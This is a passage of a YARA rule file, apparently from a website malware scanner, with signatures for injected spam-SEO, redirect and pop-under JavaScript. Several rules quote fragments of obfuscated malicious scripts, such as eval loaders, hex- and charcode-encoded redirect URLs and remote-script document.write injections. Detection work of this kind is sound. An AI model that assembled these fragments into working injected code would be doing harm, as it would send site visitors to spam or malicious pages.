        $js_spamseo_injector_074_04_r0 = /if\([\w]+===undefined\)\{var [\w]+=true;/
    condition:
        $trigger and PR01215 and PR00621 and PR00323 and $js_spamseo_injector_074_04_r0
}

private rule PR01216 : trigger
{
    strings:
        $ps0 = "screen"
    condition:
        $ps0
}

rule js_spamseo_injector_074_05 : spamseo
{
    strings:
        $trigger = ")];if(ndsw===undefined){var ndsw=true;(function(){var"
    condition:
        $trigger and PR00621 and PR00323 and PR01216
}

// MANUAL FIX NECESSARY
rule js_spamseo_injector_074_06 : spamseo
{
    strings:
        $trigger = "screen"
        $js_spamseo_injector_074_06_r0 = /;[\s]*if[\s]*\(nds.[\s]*===[\s]*undefined\)[\s]*\{[\s]*[^@]+HttpClient[\s]*=[\s]*function/
    condition:
        $trigger and PR00621 and PR00323 and $js_spamseo_injector_074_06_r0
}

rule js_spamseo_injector_074_07 : spamseo
{
    strings:
        $trigger = "function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}"
    condition:
        $trigger and PR00621 and PR00323 and PR01216
}

private rule PR01217 : trigger
{
    strings:
        $ps0 = ";if(nds"
    condition:
        $ps0
}

rule js_spamseo_injector_074_08 : spamseo
{
    strings:
        $trigger = "screen"
    condition:
        $trigger and PR01217 and PR00621 and PR00323
}

private rule PR01218 : trigger
{
    strings:
        $ps0 = ")).innerHTML);"
    condition:
        $ps0
}

private rule PR01219 : trigger
{
    strings:
        $ps0 = "d3JhcHBlcg=="
    condition:
        $ps0
}

rule js_spamseo_injector_075 : spamseo
{
    strings:
        $trigger = "Zm9vdGVyX2JvdHRvbV9jb250ZW50"
    condition:
        $trigger and PR00653 and PR01218 and PR01219
}

private rule PR01220 : trigger
{
    strings:
        $ps0 = "=[\"\\x25\\x33\\x43\\x25\\x37\\x33"
    condition:
        $ps0
}

rule js_spamseo_injector_076 : spamseo
{
    strings:
        $trigger = "\\x25\\x37\\x34\\x25\\x33\\x45\",\"\\x77\\x72\\x69\\x74\\x65\"];document[_0x"
    condition:
        $trigger and PR01220
}

private rule PR01221 : trigger
{
    strings:
        $ps0 = "+window.location.search.replace('?', '&')+\"&\"+"
    condition:
        $ps0
}

private rule PR01222 : trigger
{
    strings:
        $ps0 = ";}else if(_gl!==\"!1\"&&_gl!==\"!2\"&&_gl!==null){window["
    condition:
        $ps0
}

rule js_spamseo_injector_077 : spamseo
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR01221 and PR01222
}

private rule PR01223 : trigger
{
    strings:
        $ps0 = "eval(decodeURIComponent(_twemoji));"
    condition:
        $ps0
}

rule js_spamseo_injector_078 : spamseo
{
    strings:
        $trigger = "\";eval("
    condition:
        $trigger and PR01223
}

rule js_spamseo_injector_079 : spamseo
{
    strings:
        $trigger = "=Number.MAX_VALUE,d1=new Date(),d2=new Date(d1.getTime()+2),z=2,aa=document.createTextNode"
    condition:
        $trigger and PR00029
}

private rule PR01224 : trigger
{
    strings:
        $ps0 = "innerHTML=r.responseText;document.body.appendChild(e);}}};r.send("
    condition:
        $ps0
}

private rule PR01225 : trigger
{
    strings:
        $ps0 = "document.getElementById("
    condition:
        $ps0
}

rule js_spamseo_injector_080 : spamseo
{
    strings:
        $trigger = "document.createElement('script')"
    condition:
        $trigger and PR00664 and PR00666 and PR01224 and PR01225
}

private rule PR01226 : trigger
{
    strings:
        $ps0 = ",\"\"]),jQuery(document).ready(function(){wl.href.match(/wp-admin/g)||("
    condition:
        $ps0
}

rule js_spamseo_injector_081 : spamseo
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR01226
}

private rule PR01227 : trigger
{
    strings:
        $ps0 = "for(var e=section.replace,n=\"\",t=e.length-1;t>=0;t--)"
    condition:
        $ps0
}

private rule PR01228 : trigger
{
    strings:
        $ps0 = "//:sptth\\\"="
    condition:
        $ps0
}

rule js_spamseo_injector_084 : spamseo
{
    strings:
        $trigger = "if (data[i].url === window.location.pathname + window.location.search)"
    condition:
        $trigger and PR01227 and PR00050 and PR01228
}

private rule PR01229 : trigger
{
    strings:
        $ps0 = "window.location.search"
    condition:
        $ps0
}

rule js_spamseo_injector_085 : spamseo
{
    strings:
        $trigger = "document.body.innerHTML.replace(section.search"
    condition:
        $trigger and PR01229
}

private rule PR01230 : trigger
{
    strings:
        $ps0 = "\"==typeof Storage?("
    condition:
        $ps0
}

private rule PR01231 : trigger
{
    strings:
        $ps0 = "(){try{if(document.hidden)return;clearInterval("
    condition:
        $ps0
}

private rule PR01232 : trigger
{
    strings:
        $ps0 = ".pop().split(\";\").shift():\"\"}function"
    condition:
        $ps0
}

rule js_spamseo_injector_086 : spamseo
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR01230 and PR00029 and PR01231 and PR01232
}

private rule PR01233 : trigger
{
    strings:
        $ps0 = "title: 'You not a robot?:"
    condition:
        $ps0
}

private rule PR01234 : trigger
{
    strings:
        $ps0 = "MESSAGES.current = MESSAGES[getLanguage()] || MESSAGES.en;"
    condition:
        $ps0
}

rule js_spamseo_injector_087 : spamseo
{
    strings:
        $trigger = "file"
    condition:
        $trigger and PR01233 and PR01234
}

private rule PR01235 : trigger
{
    strings:
        $ps0 = "function checkTarget(e)"
    condition:
        $ps0
}

rule js_spamseo_injector_088 : spamseo
{
    strings:
        $trigger = "function doOpen(url)"
    condition:
        $trigger and PR00050 and PR00323 and PR01235
}

private rule PR01236 : trigger
{
    strings:
        $ps0 = "123,100,46,103,101,116,69,108,101,109,101,110,116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,125,10,125));"
    condition:
        $ps0
}

rule js_spamseo_injector_089 : spamseo
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR01236
}

private rule PR01237 : trigger
{
    strings:
        $ps0 = "/*trymyexitthis*/"
    condition:
        $ps0
}

private rule PR01238 : trigger
{
    strings:
        $ps0 = ",116,115,66,121,84,97,103,78,97,109,101,40,39,104,101,97,100,39,41,91,48,93,46,97,112,112,101,110,100,67,104,105,108,100,40,115,41,59,125,10,125));"
    condition:
        $ps0
}

rule js_spamseo_injector_089_02 : spamseo
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR01237 and PR01238
}

// MANUAL FIX NECESSARY
rule js_spamseo_injector_091 : spamseo
{
    strings:
        $trigger = "document.write"
        $js_spamseo_injector_091_r0 = /document.write\s*..<.\s*\+\s*[a-z]\[[0-9]\]\+.\s*.\+[a-z]\[[0-9]\]\+.>[^>]+[a-z]\[[0-9]\][^;]+;/
    condition:
        $trigger and $js_spamseo_injector_091_r0
}

// MANUAL FIX NECESSARY
rule js_spamseo_injector_092 : spamseo
{
    strings:
        $trigger = "document.write"
        $js_spamseo_injector_092_r0 = /document.write\(.<iframe src=.http:..\d+.\d+.\d+.\d+.\S+.php.\s*style=.[^;]+;.><.iframe>.\);/
    condition:
        $trigger and $js_spamseo_injector_092_r0
}

// MANUAL FIX NECESSARY
rule js_spamseo_injector_093 : spamseo
{
    strings:
        $trigger = "document.write"
        $js_spamseo_injector_093_r0 = /['\"<script\+]{10,}/
        $js_spamseo_injector_093_r1 = /document.write(ln)?\(['\"<script\+]{10,}[^;]+src=.(http|\/\/)[^;]+\?js=\d+[^;]+['\"script\+>]{10,}\);/
    condition:
        $trigger and $js_spamseo_injector_093_r0 and $js_spamseo_injector_093_r1
}

// MANUAL FIX NECESSARY
rule js_spamseo_injector_094 : spamseo
{
    strings:
        $trigger = "flashplayer\">"
        $js_spamseo_injector_094_r0 = /[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}\.[\d]{1,3}[^\"]+flashplayer/
    condition:
        $trigger and PR00050 and $js_spamseo_injector_094_r0
}

// MANUAL FIX NECESSARY
rule js_spamseo_injector_096 : spamseo
{
    strings:
        $trigger = "<script"
        $js_spamseo_injector_096_r0 = /echo .<script src[\s]*=[\s]*.https?:..[\d]+\.[\d]+\.[\d]+\.[\d][^>]+>[\s]*<.script>.;/
    condition:
        $trigger and $js_spamseo_injector_096_r0
}

private rule PR01239 : trigger
{
    strings:
        $ps0 = "encodeURIComponent(document.referrer)"
    condition:
        $ps0
}

rule js_spamseo_injector_100 : spamseo
{
    strings:
        $trigger = "alert"
    condition:
        $trigger and PR00786 and PR01239
}

private rule PR01240 : trigger
{
    strings:
        $ps0 = "createElement('script');"
    condition:
        $ps0
}

private rule PR01241 : trigger
{
    strings:
        $ps0 = "echo(\"<script>;(function(){var"
    condition:
        $ps0
}

private rule PR01242 : trigger
{
    strings:
        $ps0 = "==-1||window.localStorage["
    condition:
        $ps0
}

private rule PR01243 : trigger
{
    strings:
        $ps0 = ");}})();</script>\");"
    condition:
        $ps0
}

rule js_spamseo_injector_100_02 : spamseo
{
    strings:
        $trigger = "VjJsdVpHOTNjdz09"
    condition:
        $trigger and PR01240 and PR01241 and PR01242 and PR00323 and PR01243
}

private rule PR01244 : trigger
{
    strings:
        $ps0 = "<script>;(function(){var"
    condition:
        $ps0
}

private rule PR01245 : trigger
{
    strings:
        $ps0 = "('T2k4dktGdGVMMTByS1M4PQ=='));if(!"
    condition:
        $ps0
}

rule js_spamseo_injector_101 : spamseo
{
    strings:
        $trigger = "VjJsdVpHOTNjdz09"
    condition:
        $trigger and PR01244 and PR01240 and PR01245 and PR01242 and PR00323
}

private rule PR01246 : trigger
{
    strings:
        $ps0 = "iframe|document|top|innerHTML|body|www|http|xyz|wintercomo|src"
    condition:
        $ps0
}

rule js_spamseo_japanesespam_001 : spamseo
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR00677 and PR01246
}

private rule PR01247 : trigger
{
    strings:
        $ps0 = "req.open('POST', drug_name + '/thread.php"
    condition:
        $ps0
}

rule js_spamseo_pharma_001 : spamseo
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR01247
}

private rule PR01248 : trigger
{
    strings:
        $ps0 = "cdn.popcash.net/pop.js"
    condition:
        $ps0
}

rule js_spamseo_popcash_001 : spamseo
{
    strings:
        $trigger = "var wid"
    condition:
        $trigger and PR01248 and PR00050
}

private rule PR01249 : trigger
{
    strings:
        $ps0 = "popcash.net"
    condition:
        $ps0
}

private rule PR01250 : trigger
{
    strings:
        $ps0 = "var wid"
    condition:
        $ps0
}

rule js_spamseo_popcash_001_02 : spamseo
{
    strings:
        $trigger = "var uid"
    condition:
        $trigger and PR01249 and PR00050 and PR01250
}

private rule PR01251 : trigger
{
    strings:
        $ps0 = ";document.write("
    condition:
        $ps0
}

rule js_spamseo_popcash_001_03 : spamseo
{
    strings:
        $trigger = "cdn.popcash.net/pop.js%22%3E%3C/script%3E"
    condition:
        $trigger and PR00050 and PR01251
}

private rule PR01252 : trigger
{
    strings:
        $ps0 = "flex; align-items: center; justify-content: center; overflow: auto;\">' + '<a href=\"http://goo.gl/"
    condition:
        $ps0
}

rule js_spamseo_pornspam_001 : spamseo
{
    strings:
        $trigger = "document"
    condition:
        $trigger and PR01252
}

private rule PR01253 : trigger
{
    strings:
        $ps0 = "window.open(CONTENT_URI, '_blank');"
    condition:
        $ps0
}

rule js_spamseo_pornspam_002 : spamseo
{
    strings:
        $trigger = "(!getCookie(cname) && CONTENT_URI)"
    condition:
        $trigger and PR00323 and PR01253
}

private rule PR01254 : trigger
{
    strings:
        $ps0 = "+=\"\\x"
    condition:
        $ps0
}

rule js_spamseo_pseudodarkleech_003 : spamseo
{
    strings:
        $trigger = "style=\"position: absolute; top: -"
    condition:
        $trigger and PR01254 and PR00719
}

rule js_spamseo_randomredirect_001 : spamseo
{
    strings:
        $trigger = "redir = urls[rand(0, urls.length-1)]+rand(11,999);"
    condition:
        $trigger
}

rule js_spamseo_redirect_001 : spamseo
{
    strings:
        $trigger = "<script>if(navigator.userAgent.match(/^1207."
    condition:
        $trigger and PR00371
}

rule js_spamseo_redirect_002 : spamseo
{
    strings:
        $trigger = "\\x77\\x3A\\x2F\\x2F\\x74\\x2E\\x75\\x2E\\x6C\\x2E\\x76\\x2F\\x73\\x2E\\x72\\x3F\\x71\\x3D"
    condition:
        $trigger
}

private rule PR01255 : trigger
{
    strings:
        $ps0 = "\"http://lily666.com"
    condition:
        $ps0
}

rule js_spamseo_redirect_004 : spamseo
{
    strings:
        $trigger = "gent"
    condition:
        $trigger and PR01255
}

private rule PR01256 : trigger
{
    strings:
        $ps0 = "if(s.indexOf(\"google\")>0 || s.indexOf(\"bing\")>0"
    condition:
        $ps0
}

rule js_spamseo_redirect_007 : spamseo
{
    strings:
        $trigger = "location"
    condition:
        $trigger and PR01256 and PR00323
}

private rule PR01257 : trigger
{
    strings:
        $ps0 = "if (s.indexOf('google') > 0 || s.indexOf('aol')"
    condition:
        $ps0
}

rule js_spamseo_redirect_007_02 : spamseo
{
    strings:
        $trigger = "location"
    condition:
        $trigger and PR01257 and PR00323
}

private rule PR01258 : trigger
{
    strings:
        $ps0 = "weightlossmaxer|location"
    condition:
        $ps0
}

rule js_spamseo_redirect_008 : spamseo
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR01258
}

private rule PR01259 : trigger
{
    strings:
        $ps0 = "document.location = \"http://cort.as"
    condition:
        $ps0
}

rule js_spamseo_redirect_009 : spamseo
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR01259
}

rule js_spamseo_redirect_011 : spamseo
{
    strings:
        $trigger = "\"userAgent\",\"test\",\"substr\",\"location\"];function setCookie(_0x"
    condition:
        $trigger
}

rule js_spamseo_redirect_013 : spamseo
{
    strings:
        $trigger = "if(patrn.exec(rUrl))window.location.href=toUrl;"
    condition:
        $trigger
}

private rule PR01260 : trigger
{
    strings:
        $ps0 = "indexOf"
    condition:
        $ps0
}

private rule PR01261 : trigger
{
    strings:
        $ps0 = "iPhone"
    condition:
        $ps0
}

private rule PR01262 : trigger
{
    strings:
        $ps0 = "userAgent"
    condition:
        $ps0
}

rule js_spamseo_redirect_014 : spamseo
{
    strings:
        $trigger = "|maxTouchPoints"
    condition:
        $trigger and PR00604 and PR01260 and PR01261 and PR00603 and PR01262
}

private rule PR01263 : trigger
{
    strings:
        $ps0 = ".exe\";"
    condition:
        $ps0
}

private rule PR01264 : trigger
{
    strings:
        $ps0 = "setTimeout('getgoing()',1);"
    condition:
        $ps0
}

rule js_spamseo_redirect_015 : spamseo
{
    strings:
        $trigger = "top.location=\"http:"
    condition:
        $trigger and PR01263 and PR01264 and PR00596
}

// MANUAL FIX NECESSARY
private rule PR01265 : trigger
{
    strings:
        $ps0 = "](0)^"
    condition:
        $ps0
}

rule js_spamseo_redirect_016 : spamseo
{
    strings:
        $trigger = "document["
        $js_spamseo_redirect_016_r0 = /=\s*'';\s*for\s*\(/
    condition:
        $trigger and PR01265 and $js_spamseo_redirect_016_r0
}

private rule PR01266 : trigger
{
    strings:
        $ps0 = "|var|Wsites|if|ads_wins|window|so|facebook|search|360|sogou|"
    condition:
        $ps0
}

rule js_spamseo_redirect_018 : spamseo
{
    strings:
        $trigger = "eval(function(p,a,c,k,e,"
    condition:
        $trigger and PR01266
}

private rule PR01267 : trigger
{
    strings:
        $ps0 = "|msn.)/i)){document[_0x"
    condition:
        $ps0
}

rule js_spamseo_redirect_019 : spamseo
{
    strings:
        $trigger = "\"\\x53\\x74\\x61\\x74\\x73\\x4F\\x6E\\x65\",\"\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66\",\"\\x63\\x6F\\x6F\\x6B\\x69\\x65\""
    condition:
        $trigger and PR00332 and PR01267
}

rule js_spamseo_redirect_020 : spamseo
{
    strings:
        $trigger = "w=this['unescape'](y);this['eval'](w);"
    condition:
        $trigger
}

rule js_spamseo_redirect_021 : spamseo
{
    strings:
        $trigger = "<script type='text/javascript'>(new Function(String.fromCharCode("
    condition:
        $trigger
}

private rule PR01268 : trigger
{
    strings:
        $ps0 = "vmsg.onclick = function(){load2();};}window.onload=checkCount;"
    condition:
        $ps0
}

rule js_spamseo_redirect_022 : spamseo
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR01268
}

private rule PR01269 : trigger
{
    strings:
        $ps0 = "drid=' + drug_name"
    condition:
        $ps0
}

rule js_spamseo_redirect_023 : spamseo
{
    strings:
        $trigger = "location"
    condition:
        $trigger and PR01269 and PR00323
}

rule js_spamseo_redirect_024 : spamseo
{
    strings:
        $trigger = "))})(String.fromCharCode,eval)</script>"
    condition:
        $trigger
}

private rule PR01270 : trigger
{
    strings:
        $ps0 = "window.location.href=\""
    condition:
        $ps0
}

private rule PR01271 : trigger
{
    strings:
        $ps0 = "biso)(\\.[a-z0-9\\-]+){1,2}\\//ig;"
    condition:
        $ps0
}

rule js_spamseo_redirect_025 : spamseo
{
    strings:
        $trigger = "<script>var regexp=/\\.(aol|google"
    condition:
        $trigger and PR01270 and PR00080 and PR01271
}

rule js_spamseo_redirect_026 : spamseo
{
    strings:
        $trigger = "\\x67\\x6F\\x2E\\x61\\x64\\x32\\x75\\x70\\x2E\\x63\\x6F\\x6D"
    condition:
        $trigger and PR00332
}

rule js_spamseo_redirect_027 : spamseo
{
    strings:
        $trigger = "script&se_referrer=' + encodeURIComponent"
    condition:
        $trigger and PR00267 and PR00050
}

private rule PR01272 : trigger
{
    strings:
        $ps0 = "%26%6c%6f%63%61%74%69%6f%6e%2e%72%65%70%6c%61%63%65%28%22%68%74%74%70%73%3a%2f%2f%67%6f%6f%2e%67%6c%2f"
    condition:
        $ps0
}

rule js_spamseo_redirect_028 : spamseo
{
    strings:
        $trigger = "document.write("
    condition:
        $trigger and PR01272 and PR00050
}

rule js_spamseo_redirect_029 : spamseo
{
    strings:
        $trigger = "\\x67\\x65\\x74\\x68\\x65\\x72\\x65\\x2E\\x69\\x6E\\x66\\x6F"
    condition:
        $trigger and PR00641
}

rule js_spamseo_redirect_030 : spamseo
{
    strings:
        $trigger = "%6e%63%74%69%6f%6e%7c%73%63%72%69%70%74%7c%76%61%72%7c%74%72%79%7c%31%30%7c%66%6f%72%7c%6a%61%76%61%73%63%72%69%70%74%7c%77%72%69%74%65%7c%64%6f%63%75%6d%65%6e%74%7c%75%6e%65%73%63%61%70%65%7c%74%65%78%74%7c%74%79%70%65%7c%68%69%73%74%6f%72%79%7c%67%6f%6f%7c%68%74%74%70%73%7c%67%6c%7c%63%61%74%63%68%7c%78%79%4c%36%6c%51%7c%6f%6e%70%6f%70%73%74%61%74%65%7c%70%75%73%68%53%74%61%74%65%7c%73%74%61%74%65%7c%72%65%70%6c%61%63%65%7c%6c%6f%63%61%74%69%6f%6e%22%2e%73%70%6c%69%74%28%22%7c%22%29%29%29"
    condition:
        $trigger and PR00231
}

private rule PR01273 : trigger
{
    strings:
        $ps0 = "+=String[\"fromCharCode\"](eval("
    condition:
        $ps0
}

private rule PR01274 : trigger
{
    strings:
        $ps0 = "if(1)"
    condition:
        $ps0
}

private rule PR01275 : trigger
{
    strings:
        $ps0 = ".body)}catch("
    condition:
        $ps0
}

private rule PR01276 : trigger
{
    strings:
        $ps0 = "=document;"
    condition:
        $ps0
}

rule js_spamseo_redirect_032 : spamseo
{
    strings:
        $trigger = "=window;"
    condition:
        $trigger and PR01273 and PR01274 and PR01275 and PR01276
}

private rule PR01277 : trigger
{
    strings:
        $ps0 = "[\"length\"];"
    condition:
        $ps0
}

private rule PR01278 : trigger
{
    strings:
        $ps0 = ")+parseInt("
    condition:
        $ps0
}

private rule PR01279 : trigger
{
    strings:
        $ps0 = "if(document.querySelector)"
    condition:
        $ps0
}

rule js_spamseo_redirect_032_02 : spamseo
{
    strings:
        $trigger = "].apply(String,"
    condition:
        $trigger and PR00029 and PR01277 and PR01278 and PR01279
}

rule js_spamseo_redirect_033 : spamseo
{
    strings:
        $trigger = "|document|com|en|terms|b1xz6cku|cookie|"
    condition:
        $trigger and PR00677 and PR00604
}

rule js_spamseo_redirect_034 : spamseo
{
    strings:
        $trigger = "%0A%09%09%72%65%64%69%72%65%63%74%5F%74%6F%28%22%68%74%74%70%3A%2F%2F"
    condition:
        $trigger and PR00231
}

private rule PR01280 : trigger
{
    strings:
        $ps0 = "var page = new Array(howMany"
    condition:
        $ps0
}

rule js_spamseo_redirect_035 : spamseo
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR01280
}

private rule PR01281 : trigger
{
    strings:
        $ps0 = "data:application/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoI"
    condition:
        $ps0
}

rule js_spamseo_redirect_036 : spamseo
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR01281
}

rule js_spamseo_redirect_037 : spamseo
{
    strings:
        $trigger = "var adlinkfly_url = 'https://cutwin.com"
    condition:
        $trigger and PR00050
}

// MANUAL FIX NECESSARY
rule js_spamseo_redirect_038 : spamseo
{
    strings:
        $trigger = "<script"
        $js_spamseo_redirect_038_r0 = /(locationforexpert|waynickbookgroup)/
    condition:
        $trigger and $js_spamseo_redirect_038_r0
}

private rule PR01282 : trigger
{
    strings:
        $ps0 = "gent"
    condition:
        $ps0
}

rule js_spamseo_redirect_039 : spamseo
{
    strings:
        $trigger = "return whatever.list[n].split(\"\").reverse().join(\"\");"
    condition:
        $trigger and PR01282
}

rule js_spamseo_redirect_040 : spamseo
{
    strings:
        $trigger = "cihNYXRoLnJhbmRvbSgpICogNSk7IA0KaWYgKG51bWJlcj"
    condition:
        $trigger and PR00769
}

private rule PR01283 : trigger
{
    strings:
        $ps0 = "var i=scrpts"
    condition:
        $ps0
}

private rule PR01284 : trigger
{
    strings:
        $ps0 = "};var scrpts=document[_0x"
    condition:
        $ps0
}

rule js_spamseo_redirect_041 : spamseo
{
    strings:
        $trigger = ";var url=String[_0x"
    condition:
        $trigger and PR01283 and PR01284
}

// MANUAL FIX NECESSARY
rule js_spamseo_redirect_041_02 : spamseo
{
    strings:
        $trigger = ";var url=String[_0x"
        $js_spamseo_redirect_041_02_r0 = /\(\)[;\}]+<.script>/
    condition:
        $trigger and PR01283 and PR01284 and $js_spamseo_redirect_041_02_r0
}

rule js_spamseo_redirect_041_03 : spamseo
{
    strings:
        $trigger = "\"\\x62\\x6F\\x64\\x79\",\"\\x62\\x65\\x66\\x6F\\x72\\x65\\x65\\x6E\\x64\",\"\\x3C\\x73\\x63\\x72\\x69\\x70\\x74"
    condition:
        $trigger and PR00639
}

// MANUAL FIX NECESSARY
private rule PR01285 : trigger
{
    strings:
        $ps0 = "[\"\\x73\\x63\\x72\\x69\\x70\\x74\",\"\\x63\\x72\\x65\\x61\\x74\\x65\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\",\"\\x74\\x79\\x70\\x65\",\"\\x74\\x65\\x78\\x74\\x2F\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\",\"\\x61\\x73\\x79\\x6E\\x63"
    condition:
        $ps0
}

rule js_spamseo_redirect_041_04 : spamseo
{
    strings:
        $trigger = "var _0x"
        $js_spamseo_redirect_041_04_r0 = /var _0x[\w]+[\s]*=[\s]*\[\".x73.x63.x72/
    condition:
        $trigger and PR01285 and PR00639 and $js_spamseo_redirect_041_04_r0
}

private rule PR01286 : trigger
{
    strings:
        $ps0 = "100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40"
    condition:
        $ps0
}

private rule PR01287 : trigger
{
    strings:
        $ps0 = "100, 111, 99, 117, 109, 101, 110, 116, 91"
    condition:
        $ps0
}

rule js_spamseo_redirect_041_05 : spamseo
{
    strings:
        $trigger = "fromCharCode"
    condition:
        $trigger and PR00029 and PR01286 and PR01287
}

// MANUAL FIX NECESSARY
private rule PR01288 : trigger
{
    strings:
        $ps0 = "[0x0])[0x0];"
    condition:
        $ps0
}

private rule PR01289 : trigger
{
    strings:
        $ps0 = "!![];_0x"
    condition:
        $ps0
}

rule js_spamseo_redirect_041_06 : spamseo
{
    strings:
        $trigger = "]];(function(){var _0x"
        $js_spamseo_redirect_041_06_r0 = /(\">|\(|\(\)\);|^)[\s]*var _0x[\w]+[\s]*=[\s]*\[_0x[\w]+\[[\d]+\],/
    condition:
        $trigger and PR01288 and PR00639 and PR01289 and PR00638 and $js_spamseo_redirect_041_06_r0
}

// MANUAL FIX NECESSARY
rule js_spamseo_redirect_041_07 : spamseo
{
    strings:
        $trigger = "fromCharCode"
        $js_spamseo_redirect_041_07_r0 = /var _0x[\w]+ = 1;/
    condition:
        $trigger and PR00029 and PR01287 and $js_spamseo_redirect_041_07_r0
}

// MANUAL FIX NECESSARY
rule js_spamseo_redirect_041_08 : spamseo
{
    strings:
        $trigger = "\\x7"
        $js_spamseo_redirect_041_08_r0 = /var _0x[\w]+[\s]*=[\s]*\[\".x...x...x...x...x...[^;]{1000}[^;]+\];[\s]*var[\s]*_0x[\w]+[\s]*=[\s]*\[_0x[\w]+\[[\d]+\],[\s]*_0x[\w]+\[[\d]+\],/
    condition:
        $trigger and PR00332 and $js_spamseo_redirect_041_08_r0
}

rule js_spamseo_redirect_041_09 : spamseo
{
    strings:
        $trigger = "document[_0x"
    condition:
        $trigger and PR01285
}

private rule PR01290 : trigger
{
    strings:
        $ps0 = "getElementsByTagName','insertBefore',"
    condition:
        $ps0
}

private rule PR01291 : trigger
{
    strings:
        $ps0 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="
    condition:
        $ps0
}

rule js_spamseo_redirect_041_10 : spamseo
{
    strings:
        $trigger = "),'id','cdn"
    condition:
        $trigger and PR01290 and PR00647 and PR01291
}

private rule PR01292 : trigger
{
    strings:
        $ps0 = "scripts[\"\\x6C\\x65\\x6E\\x67\\x74\\x68\"];i++){if(scripts[i][\"\\x69\\x64\"]=="
    condition:
        $ps0
}

rule js_spamseo_redirect_042 : spamseo
{
    strings:
        $trigger = "document["
    condition:
        $trigger and PR01292
}

private rule PR01293 : trigger
{
    strings:
        $ps0 = "if(document.referrer.match("
    condition:
        $ps0
}

rule js_spamseo_redirect_043 : spamseo
{
    strings:
        $trigger = "+document.location.hostname;"
    condition:
        $trigger and PR01293
}

private rule PR01294 : trigger
{
    strings:
        $ps0 = "<body onLoad=\"setTimeout('delayer()', 1)\">"
    condition:
        $ps0
}

rule js_spamseo_redirect_044 : spamseo
{
    strings:
        $trigger = "<script"
    condition:
        $trigger and PR00371 and PR01294
}

private rule PR01295 : trigger
{
    strings:
        $ps0 = "100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 114, 101, 112, 108, 97, 99, 101"
    condition:
        $ps0
}

private rule PR01296 : trigger
{
    strings:
        $ps0 = "100, 111, 99, 117, 109, 101, 110, 116, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 114, 101, 102"
    condition:
        $ps0
}

rule js_spamseo_redirect_045 : spamseo
{
    strings:
        $trigger = "119, 105, 110, 100, 111, 119, 46, 108, 111, 99, 97, 116, 105, 111, 110, 46, 104, 114, 101, 102"
    condition:
        $trigger and PR00676 and PR01295 and PR01296
}

// MANUAL FIX NECESSARY
rule js_spamseo_redirect_046 : spamseo
{
    strings:
        $trigger = "return String.fromCharCode("
        $js_spamseo_redirect_046_r0 = /function [\w]+\(\)[\s]*\{[\s]*[\w]+[\s]*=[\s]*[\w]+\(\);[\s]*[\w]+[\s]*=[\s]*\[[\d\s,]{30,}\];[\s]*return [\w]+\([\w]+,[\s]*[\w]+\);[\s]*\}/
    condition:
        $trigger and $js_spamseo_redirect_046_r0
}

rule js_spamseo_redirect_047 : spamseo
{
    strings:
        $trigger = "<script> window.location.href='https://mgcp.bet/register?intr="
    condition:
        $trigger and PR00042
}

rule js_spamseo_redirect_048 : spamseo
{
    strings:
        $trigger = "document.currentScript.parentNode.insertBefore(s, document.currentScript);"
    condition:
        $trigger and PR00851
}

private rule PR01297 : trigger
{
    strings:
        $ps0 = "createElement(String.fromCharCode"
    condition:
        $ps0
}

private rule PR01298 : trigger
{
    strings:
        $ps0 = "type=String.fromCharCode("
    condition:
        $ps0
}

private rule PR01299 : trigger
{
    strings:
        $ps0 = "document.getElementsByTagName(String.fromCharCode("
    condition:
        $ps0
}

rule js_spamseo_redirect_048_02 : spamseo
{
    strings:
        $trigger = "String.fromCharCode(104,116,116"
    condition:
        $trigger and PR01297 and PR01298 and PR01299
}

private rule PR01300 : trigger
{
    strings:
        $ps0 = "{element.parentNode.insertBefore(this, element.nextSibling);}, false;(function()"
    condition:
        $ps0
}

rule js_spamseo_redirect_048_03 : spamseo
{
    strings:
        $trigger = "String.fromCharCode(104,116,116"
    condition:
        $trigger and PR01299 and PR01300
}

private rule PR01301 : trigger
{
    strings:
        $ps0 = "window.tplogs"
    condition:
        $ps0
}

private rule PR01302 : trigger
{
    strings:
        $ps0 = "false;(function()"
    condition:
        $ps0
}

rule js_spamseo_redirect_048_04 : spamseo
{
    strings:
        $trigger = "String.fromCharCode(104,116,116"
    condition:
        $trigger and PR01301 and PR01302 and PR01299
}

private rule PR01303 : trigger
{
    strings:
        $ps0 = "||navigator['userAgent']["
    condition:
        $ps0
}

rule js_spamseo_redirect_049 : spamseo
{
    strings:
        $trigger = "wpadminbar"
    condition:
        $trigger and PR01303 and PR00323 and PR00348
}

rule js_spamseo_redirect_050 : spamseo
{
    strings:
        $trigger = "][\"\\x66\\x69\\x6c\\x74\\x65\\x72\"][\"\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72\"](((['sojson"
    condition:
        $trigger
}

rule js_spamseo_redirect_050_02 : spamseo
{
    strings:
